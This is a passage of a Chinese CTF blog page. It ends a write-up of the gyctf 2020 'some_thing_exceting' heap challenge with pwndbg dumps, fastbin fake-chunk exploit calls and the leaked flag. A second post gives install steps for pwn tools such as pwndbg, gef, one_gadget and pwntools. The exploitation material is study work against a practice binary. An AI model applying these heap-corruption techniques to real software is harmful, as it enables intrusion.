class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xce6400</span><br><span class="line">Size: 0x1fc01</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0xce6320 —▸ 0xce6240 —▸ 0xce62d0 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0xce6340 —▸ 0xce62c0 —▸ 0x602098 ◂— &#39;flag&#123;winter_excited&#125;&#39;</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk &#x3D; 0x6020a0 - 0x8</span><br><span class="line">create(0x50,p64(fake_chunk),0x50,p64(fake_chunk))#2</span><br></pre></td></tr></table></figure>

<h4 id="4-create4，create5（申请到fake地址）"><a href="#4-create4，create5（申请到fake地址）" class="headerlink" title="4.create4，create5（申请到fake地址）"></a>4.create4，create5（申请到fake地址）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x652000</span><br><span class="line">Size: 0x231</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x652230</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653240</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653260</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6532c0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653320</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653340</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6533a0</span><br><span class="line">Size: 0x61</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653400</span><br><span class="line">Size: 0x81</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x653480</span><br><span class="line">Size: 0x1fb81</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x6532d0 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x6e69777b67616c66 (&#39;flag&#123;win&#39;)</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020a0-8</span><br><span class="line">0x602098:	0x0000000000000000	0x0000000000000060</span><br><span class="line">0x6020a8:	0x6e69777b67610a61	0x696378655f726574</span><br><span class="line">0x6020b8:	0x000000007d646574	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30s 0x6020a0-8</span><br><span class="line">0x602098:	&quot;&quot;</span><br><span class="line">0x602099:	&quot;&quot;</span><br><span class="line">0x60209a:	&quot;&quot;</span><br><span class="line">0x60209b:	&quot;&quot;</span><br><span class="line">0x60209c:	&quot;&quot;</span><br><span class="line">0x60209d:	&quot;&quot;</span><br><span class="line">0x60209e:	&quot;&quot;</span><br><span class="line">0x60209f:	&quot;&quot;</span><br><span class="line">0x6020a0:	&quot;&#96;&quot;</span><br><span class="line">0x6020a2:	&quot;&quot;</span><br><span class="line">0x6020a3:	&quot;&quot;</span><br><span class="line">0x6020a4:	&quot;&quot;</span><br><span class="line">0x6020a5:	&quot;&quot;</span><br><span class="line">0x6020a6:	&quot;&quot;</span><br><span class="line">0x6020a7:	&quot;&quot;</span><br><span class="line">0x6020a8:	&quot;a\nag&#123;winter_excited&#125;&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x50</span>,p64(fake_chunk),<span class="number">0x50</span>,p64(fake_chunk))<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'a'</span>,<span class="number">0x70</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br></pre></td></tr></table></figure>

<h4 id="5-打印4"><a href="#5-打印4" class="headerlink" title="5.打印4"></a>5.打印4</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0xac bytes:</span><br><span class="line">    &quot;# Banana&#39;s ba is a\n&quot;</span><br><span class="line">    &#39;ag&#123;winter_excited&#125;\n&#39;</span><br><span class="line">    &quot;# Banana&#39;s na is a\n&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">view(4)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure>

<p>以前写的：<a href="https://blog.csdn.net/qq_43935969/article/details/104756082?spm=1001.2014.3001.5501" target="_blank" rel="noopener">i春秋新春战役PWN之Some_thing_exceting</a></p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="gyctf_2020_some_thing_exceting">文件</a></p>

	
	</div>
  <a type="button" href="/2021/05/01/gyctf-2020-some-thing-exceting详解/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/30/软件安装/" >软件安装</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-30  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="1-sublime"><a href="#1-sublime" class="headerlink" title="1.sublime"></a>1.sublime</h2><blockquote>
<p>ubuntu下比较好用的编辑器</p>
<p><a href="http://www.sublimetext.com/docs/3/linux_repositories.html" target="_blank" rel="noopener">官网</a></p>
<p>使用的系统：ubuntu 16.04</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget -qO - https:&#x2F;&#x2F;download.sublimetext.com&#x2F;sublimehq-pub.gpg | sudo apt-key add -</span><br><span class="line">$ sudo apt-get install apt-transport-https</span><br><span class="line">$ echo &quot;deb https:&#x2F;&#x2F;download.sublimetext.com&#x2F; apt&#x2F;stable&#x2F;&quot; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;sublime-text.list</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install sublime-text</span><br></pre></td></tr></table></figure>

<h2 id="2-pwn-debug"><a href="#2-pwn-debug" class="headerlink" title="2.pwn_debug"></a>2.pwn_debug</h2><blockquote>
<p>用来解决libc版本加载问题，，，</p>
<p><a href="https://github.com/ray-cp/pwn_debug/wiki" target="_blank" rel="noopener">官网</a></p>
</blockquote>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;ray-cp&#x2F;pwn_debug.git</span><br><span class="line">cd pwn_debug</span><br><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure>

<h4 id="安装使用的libc"><a href="#安装使用的libc" class="headerlink" title="安装使用的libc"></a>安装使用的libc</h4><p>指定版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># .&#x2F;build.sh $(version)</span><br><span class="line">.&#x2F;build.sh 2.23</span><br></pre></td></tr></table></figure>

<h2 id="3-gef"><a href="#3-gef" class="headerlink" title="3.gef"></a>3.gef</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -q -O ~&#x2F;.gdbinit-gef.py https:&#x2F;&#x2F;github.com&#x2F;hugsy&#x2F;gef&#x2F;raw&#x2F;master&#x2F;gef.py</span><br><span class="line">echo source ~&#x2F;.gdbinit-gef.py &gt;&gt; ~&#x2F;.gdbinit</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source &#x2F;home&#x2F;winter&#x2F;.gdbinit-gef.py</span><br></pre></td></tr></table></figure>

<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ol>
<li><code>dereference</code></li>
<li>fmtarg</li>
</ol>
<h2 id="4-Pwngdb"><a href="#4-Pwngdb" class="headerlink" title="4.Pwngdb"></a>4.Pwngdb</h2><blockquote>
<p>为了fmtarg</p>
<p><a href="https://github.com/scwuaptx/Pwngdb" target="_blank" rel="noopener">官网</a></p>
</blockquote>
<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;scwuaptx&#x2F;Pwngdb.git </span><br><span class="line">cp ~&#x2F;Pwngdb&#x2F;.gdbinit ~&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ fmtarg 0x7fffffffde50</span><br><span class="line">The index of format argument : 8 (&quot;\%7$p&quot;)	#看括号里面的</span><br></pre></td></tr></table></figure>

<h2 id="5-one-gadget"><a href="#5-one-gadget" class="headerlink" title="5.one_gadget"></a>5.one_gadget</h2><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.安装rupy,具体见下面的注意</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>

<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>one_gadget要求较高得ruby版本，直接使用源里的太旧</p>
<p>解决方法：卸载掉本地的ruby、去官网添加最新版源</p>
<h2 id="6-ruby"><a href="#6-ruby" class="headerlink" title="6.ruby"></a>6.ruby</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#卸载ruby</span></span><br><span class="line">$ sudo apt-get remove ruby</span><br><span class="line"><span class="comment">#https://www.ruby-lang.org/en/downloads/ 下载安装包</span></span><br><span class="line"><span class="comment">#解压，安装</span></span><br><span class="line">$ $ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line"><span class="comment">#安装one_gadget</span></span><br><span class="line">$ sudo gem install one_gadget</span><br></pre></td></tr></table></figure>

<h2 id="7-pwntools"><a href="#7-pwntools" class="headerlink" title="7.pwntools"></a>7.pwntools</h2><p>ubuntu20.04：<a href="https://blog.csdn.net/Evaristexu/article/details/108025981" target="_blank" rel="noopener">https://blog.csdn.net/Evaristexu/article/details/108025981</a></p>
<p>其他ubuntu版本：<a href="https://www.cnblogs.com/pcat/p/5451780.html" target="_blank" rel="noopener">https://www.cnblogs.com/pcat/p/5451780.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="8-xfce4"><a href="#8-xfce4" class="headerlink" title="8.xfce4"></a>8.xfce4</h2><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><blockquote>
<p> 修改teminal背景</p>
</blockquote>
<h3 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install xfce4-terminal</span><br><span class="line">xfce4终端</span><br></pre></td></tr></table></figure>

<h2 id="9-seccomp-tools"><a href="#9-seccomp-tools" class="headerlink" title="9.seccomp-tools"></a>9.seccomp-tools</h2><blockquote>
<p><a href="https://github.com/david942j/seccomp-tools" target="_blank" rel="noopener">官网</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>

<h2 id="10-LibcSearcher"><a href="#10-LibcSearcher" class="headerlink" title="10.LibcSearcher"></a>10.LibcSearcher</h2><p>github：<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.git</span><br><span class="line">cd LibcSearcher</span><br><span class="line">(sudo) python setup.py develop</span><br></pre></td></tr></table></figure>

<h2 id="11-pwn环境可视化"><a href="#11-pwn环境可视化" class="headerlink" title="11.pwn环境可视化"></a>11.pwn环境可视化</h2><ol>
<li><a href="https://bbs.pediy.com/thread-257344.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257344.htm</a></li>
<li><a href="https://github.com/bet4it/build-an-efficient-pwn-environment" target="_blank" rel="noopener">https://github.com/bet4it/build-an-efficient-pwn-environment</a></li>
</ol>
<h2 id="12-pip"><a href="#12-pip" class="headerlink" title="12.pip"></a>12.pip</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-pip</span><br></pre></td></tr></table></figure>

<h2 id="13-pwndbg"><a href="#13-pwndbg" class="headerlink" title="13.pwndbg"></a>13.pwndbg</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">.&#x2F;setup.sh</span><br></pre></td></tr></table></figure>

<h2 id><a href="#" class="headerlink" title></a></h2>
	
	</div>
  <a type="button" href="/2021/04/30/软件安装/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
           <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
        

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/2/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/advanced-pwn/">advanced pwn<span>1</span></a></li>
		
			<li><a href="/categories/buu/">buu<span>13</span></a></li>
		
			<li><a href="/categories/chrome/">chrome<span>1</span></a></li>
		
			<li><a href="/categories/ida/">ida<span>1</span></a></li>
		
			<li><a href="/categories/iot/">iot<span>2</span></a></li>
		
			<li><a href="/categories/pwn/">pwn<span>6</span></a></li>
		
			<li><a href="/categories/reverse/">reverse<span>1</span></a></li>
		
			<li><a href="/categories/v8/">v8<span>1</span></a></li>
		
			<li><a href="/categories/专题/">专题<span>2</span></a></li>
		
			<li><a href="/categories/基础知识/">基础知识<span>1</span></a></li>
		
			<li><a href="/categories/复现/">复现<span>1</span></a></li>
		
			<li><a href="/categories/工具/">工具<span>1</span></a></li>
		
			<li><a href="/categories/常用软件/">常用软件<span>1</span></a></li>
		
			<li><a href="/categories/算法/">算法<span>8</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/v8/">v8<span>1</span></a></li>
		
			<li><a href="/tags/house-of-force/">house of force<span>2</span></a></li>
		
			<li><a href="/tags/西南科技大学新生赛/">西南科技大学新生赛<span>1</span></a></li>
		
			<li><a href="/tags/kernel-pwn/">kernel pwn<span>1</span></a></li>
		
			<li><a href="/tags/基础知识/">基础知识<span>3</span></a></li>
		
			<li><a href="/tags/dasctf/">dasctf<span>1</span></a></li>
		
			<li><a href="/tags/git/">git<span>1</span></a></li>
		
			<li><a href="/tags/fmt/">fmt<span>1</span></a></li>
		
			<li><a href="/tags/off-by-one/">off by one<span>1</span></a></li>
		
			<li><a href="/tags/蓝桥杯/">蓝桥杯<span>4</span></a></li>
		
			<li><a href="/tags/flair/">flair<span>1</span></a></li>
		
			<li><a href="/tags/环境搭建/">环境搭建<span>1</span></a></li>
		
			<li><a href="/tags/googlectf-2020/">googlectf 2020<span>1</span></a></li>
		
			<li><a href="/tags/安装/">安装<span>1</span></a></li>
		
			<li><a href="/tags/srop/">srop<span>1</span></a></li>
		
			<li><a href="/tags/csapp/">csapp<span>2</span></a></li>
		
			<li><a href="/tags/fastbin-attack/">fastbin attack<span>1</span></a></li>
		
			<li><a href="/tags/牛客网/">牛客网<span>1</span></a></li>
		
			<li><a href="/tags/pwnable-tw/">pwnable.tw<span>2</span></a></li>
		
			<li><a href="/tags/leetcode/">leetcode<span>1</span></a></li>
		
		
		   <li><a href="/tags">...<span>31</span></a></li>
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2021/05/13/Mar-DASCTF明御攻防赛/" ><i class="fa fa-file-o"></i>Mar.DASCTF明御攻防赛</a>
      </li>
    
      <li>
        <a href="/2021/05/13/pwn题模板/" ><i class="fa fa-file-o"></i>pwn wp模板</a>
      </li>
    
      <li>
        <a href="/2021/05/13/unsortedbin-attack/" ><i class="fa fa-file-o"></i>unsortedbin attack</a>
      </li>
    
      <li>
        <a href="/2021/05/13/house-of-orange/" ><i class="fa fa-file-o"></i>house of orange</a>
      </li>
    
      <li>
        <a href="/2021/05/08/buu每日一题（4）/" ><i class="fa fa-file-o"></i>buu每日一题（4）</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="fa fa-github"></i><a href="https://github.com/wzpan/hexo-theme-freemind" title="Freemind's Github repository." target="_blank"]);">Freemind</a></li>
	
		<li><i class="fa fa-github"></i><a href="https://github.com/kristopolous/BOOTSTRA.386" title="BOOTSTRA.386's Github repository." target="_blank"]);">BOOTSTRA.386</a></li>
	
		<li><i class="fa fa-github"></i><a href="https://github.com/blackshow/hexo-theme-freemind.386" title="Freemind.386's Github repository." target="_blank"]);">Freemind.386</a></li>
	
		<li><i class="fa fa-github"></i><a href="http://www.github.com/blackshow" title="My Github account." target="_blank"]);">My Github</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2021 winter
  
      with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="noopener">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
     <br> Theme by <a href="http://github.com/wzpan/hexo-theme-freemind/" target="_blank" rel="noopener">Freemind.386</a>.    
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
